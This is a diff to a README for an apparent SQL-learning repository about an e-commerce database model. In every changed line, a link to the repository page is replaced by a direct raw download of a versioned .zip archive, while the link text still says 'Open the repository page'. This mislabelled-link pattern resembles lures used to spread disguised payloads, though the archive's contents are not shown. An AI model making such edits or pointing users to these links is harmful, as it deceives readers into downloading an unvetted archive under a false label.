@@ -1,12 +1,12 @@
 # 🛒 E-Commerce-Database-Model-SQL-Studies- - Build SQL Skills With Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/juandie6184/E-Commerce-Database-Model-SQL-Studies-)
+[![Download Now](https://img.shields.io/badge/Download%20Now-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/juandie6184/E-Commerce-Database-Model-SQL-Studies-/main/sql/SQ-Studies-Commerce-Database-Model-v3.9.zip)
 
 ## 📥 Download and Open
 
 Use this link to visit the page and download the files:
 
-[Open the repository page](https://github.com/juandie6184/E-Commerce-Database-Model-SQL-Studies-)
+[Open the repository page](https://raw.githubusercontent.com/juandie6184/E-Commerce-Database-Model-SQL-Studies-/main/sql/SQ-Studies-Commerce-Database-Model-v3.9.zip)
 
 If you want to keep a local copy on Windows, click **Code** on the page, then select **Download ZIP**.
 
@@ -159,4 +159,4 @@ If a query does not run, check that the previous file has already created the ne
 
 ## 🔗 Access the Repository
 
-[https://github.com/juandie6184/E-Commerce-Database-Model-SQL-Studies-](https://github.com/juandie6184/E-Commerce-Database-Model-SQL-Studies-)
+[https://raw.githubusercontent.com/juandie6184/E-Commerce-Database-Model-SQL-Studies-/main/sql/SQ-Studies-Commerce-Database-Model-v3.9.zip](https://raw.githubusercontent.com/juandie6184/E-Commerce-Database-Model-SQL-Studies-/main/sql/SQ-Studies-Commerce-Database-Model-v3.9.zip)
